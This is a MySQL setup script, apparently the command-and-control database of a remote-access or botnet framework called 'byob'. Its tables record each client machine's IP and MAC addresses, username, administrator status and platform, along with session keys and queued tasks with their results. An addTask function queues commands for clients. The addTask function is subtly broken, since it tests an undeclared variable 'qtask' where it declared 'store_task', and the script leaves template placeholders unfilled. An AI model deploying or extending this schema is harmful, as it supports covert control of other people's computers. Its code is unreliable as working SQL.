#!/usr/bin/mysql

-- Database: byob
CREATE DATABASE IF NOT EXISTS `byob`;

-- Table:    tbl_clients 
CREATE TABLE IF NOT EXISTS `byob`.`tbl_clients` (`id` serial, `uid` varchar(32) NOT NULL, `online` boolean NOT NULL DEFAULT 0,  `joined` TIMESTAMP, `last_online` TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP, `public_ip` varchar(42) NOT NULL, `mac_address` varchar(17) DEFAULT NULL, `local_ip` varchar(42) DEFAULT NULL, `username` text DEFAULT NULL, `administrator` text DEFAULT NULL, `platform` text DEFAULT NULL, `device` text DEFAULT NULL, `architecture` text DEFAULT NULL, PRIMARY KEY (`uid`(32))) ENGINE=MyISAM DEFAULT CHARSET=latin1;

-- Table:    tbl_sessions 
CREATE TABLE IF NOT EXISTS `byob`.`tbl_sessions` (`id` serial, `uid` varchar(32) NOT NULL, `client` varchar(32), `session_key` text NOT NULL, `duration` text DEFAULT NULL, PRIMARY KEY (`uid`(32))) ENGINE=MyISAM DEFAULT CHARSET=latin1;

-- Table:    tbl_tasks 
CREATE TABLE IF NOT EXISTS `byob`.`tbl_tasks` (`id` serial, `uid` varchar(32) NOT NULL, `session` varchar(32) , `client` varchar(32) , `task` text NOT NULL, `result` text DEFAULT NULL, `completed` TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP, PRIMARY KEY (`uid`(32))) ENGINE=MyISAM DEFAULT CHARSET=latin1;

-- Function: addTask 
DROP FUNCTION IF EXISTS `byob`.`addTask`;
CREATE DEFINER=`{user}`@`{host}` FUNCTION addTask(p_client varchar(32),p_session varchar(32),p_task text)
RETURNS varchar(32)
NOT DETERMINISTIC
BEGIN
    DECLARE store_task tinyint(1) DEFAULT 0;
    DECLARE task_id varchar(32) DEFAULT '00000000000000000000000000000000';
    SELECT p_task IN {tasks} INTO store_task;
    IF qtask IS TRUE THEN
        SET task_id=MD5(concat(p_client, p_session, p_task, NOW()));
        INSERT INTO tbl_tasks (uid, client, session, task) VALUES (task_id, p_client, p_session, p_task);
    END IF;
    RETURN task_id;
END;
